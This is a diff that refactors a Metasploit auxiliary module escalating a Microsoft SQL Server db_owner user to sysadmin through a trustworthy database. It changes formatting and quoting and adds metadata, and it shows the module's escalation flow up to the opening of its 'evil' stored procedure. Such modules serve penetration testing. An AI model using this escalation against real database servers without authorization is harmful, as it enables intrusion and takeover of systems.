@@ -8,18 +8,26 @@ class MetasploitModule < Msf::Auxiliary
   include Msf::OptionalSession::MSSQL
 
   def initialize(info = {})
-    super(update_info(info,
-      'Name'           => 'Microsoft SQL Server Escalate Db_Owner',
-      'Description'    => %q{
-        This module can be used to escalate privileges to sysadmin if the user has
-        the db_owner role in a trustworthy database owned by a sysadmin user.  Once
-        the user has the sysadmin role the msssql_payload module can be used to obtain
-        a shell on the system.
-      },
-      'Author'         => [ 'nullbind <scott.sutherland[at]netspi.com>'],
-      'License'        => MSF_LICENSE,
-      'References'     => [[ 'URL','http://technet.microsoft.com/en-us/library/ms188676(v=sql.105).aspx']]
-    ))
+    super(
+      update_info(
+        info,
+        'Name' => 'Microsoft SQL Server Escalate Db_Owner',
+        'Description' => %q{
+          This module can be used to escalate privileges to sysadmin if the user has
+          the db_owner role in a trustworthy database owned by a sysadmin user.  Once
+          the user has the sysadmin role the msssql_payload module can be used to obtain
+          a shell on the system.
+        },
+        'Author' => [ 'nullbind <scott.sutherland[at]netspi.com>'],
+        'License' => MSF_LICENSE,
+        'References' => [[ 'URL', 'http://technet.microsoft.com/en-us/library/ms188676(v=sql.105).aspx']],
+        'Notes' => {
+          'Stability' => [CRASH_SAFE],
+          'SideEffects' => [IOC_IN_LOGS],
+          'Reliability' => []
+        }
+      )
+    )
   end
 
   def run
@@ -31,7 +39,7 @@ class MetasploitModule < Msf::Auxiliary
       if mssql_login_datastore
         print_good('Connected.')
       else
-        print_error("Login was unsuccessful. Check your credentials.")
+        print_error('Login was unsuccessful. Check your credentials.')
         disconnect
         return
       end
@@ -46,23 +54,23 @@ class MetasploitModule < Msf::Auxiliary
       print_good("#{datastore['USERNAME']} has the sysadmin role, no escalation required.")
       disconnect
       return
-    else
-      print_status("You're NOT a sysadmin, let's try to change that")
     end
 
+    print_status("You're NOT a sysadmin, let's try to change that")
+
     # Check for trusted databases owned by sysadmins
-    print_status("Checking for trusted databases owned by sysadmins...")
+    print_status('Checking for trusted databases owned by sysadmins...')
     trust_db_list = check_trust_dbs
-    if trust_db_list.nil? || trust_db_list.length == 0
+    if trust_db_list.nil? || trust_db_list.empty?
       print_error('No databases owned by sysadmin were found flagged as trustworthy.')
       disconnect
       return
-    else
-      # Display list of accessible databases to user
-      print_good("#{trust_db_list.length} affected database(s) were found:")
-      trust_db_list.each do |db|
-        print_status(" - #{db[0]}")
-      end
+    end
+
+    # Display list of accessible databases to user
+    print_good("#{trust_db_list.length} affected database(s) were found:")
+    trust_db_list.each do |db|
+      print_status(" - #{db[0]}")
     end
 
     # Check if the user has the db_owner role in any of the databases
@@ -83,10 +91,10 @@ class MetasploitModule < Msf::Auxiliary
       if user_status == 1
         print_good("Congrats, #{datastore['USERNAME']} is now a sysadmin!.")
       else
-        print_error("Fail buckets, something went wrong.")
+        print_error('Fail buckets, something went wrong.')
       end
     else
-      print_error("Error while trying to escalate status")
+      print_error('Error while trying to escalate status')
     end
 
     disconnect
@@ -152,7 +160,7 @@ class MetasploitModule < Msf::Auxiliary
   end
 
   def escalate_privs(dbowner_db)
-    print_status("#{dbowner_db}")
+    print_status(dbowner_db.to_s)
     # Create the evil stored procedure WITH EXECUTE AS OWNER
     evil_sql_create = "use #{dbowner_db};
     DECLARE @myevil as varchar(max)
